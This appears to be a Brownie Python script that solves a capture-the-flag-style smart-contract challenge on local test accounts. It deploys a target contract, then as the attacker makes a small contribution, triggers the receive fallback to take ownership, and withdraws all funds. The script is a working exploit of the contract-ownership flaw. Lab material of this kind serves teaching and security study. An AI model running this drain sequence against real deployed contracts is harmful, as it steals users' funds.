from brownie import *
from .reports import *

a0 = accounts[0] # target deployer
a1 = accounts[1] # attacker account
BIGNUMBER = (10**18)
REPORT = Report()

REPORT.add_account(a0, 'Target deployer')
REPORT.add_account(a1, 'Attacker')

def main():
    target = prepare()
    attack(target)

def prepare():
    # deploy the target contract and send some eth
    target = Target.deploy({'from': a0})
    a0.transfer(target, a0.balance() - 1*BIGNUMBER)
    REPORT.add_contract(target, 'TARGET')

    # attacker should start with little ETH balance
    balance_to_burn = a1.balance() - 1*BIGNUMBER
    burn_address = accounts[3]
    a1.transfer(burn_address,balance_to_burn)
    REPORT.print()
    REPORT.txt_print('PRE-ATTACK STATE IS READY')

    return target

def attack(target):

    # some contribution is required to pass through the following fallback
    contribution = 0.0005*BIGNUMBER
    target.contribute({'from': a1, 'value': contribution})
    REPORT.print()
    # invoke the receive
    a1.transfer(target, 1)
    

    # withdraw all funds from the target
    target.withdraw({'from': a1})

    REPORT.print()
    if a1.balance()>50*BIGNUMBER :
        REPORT.txt_print('ATTACK IS SUCCESSFUL')
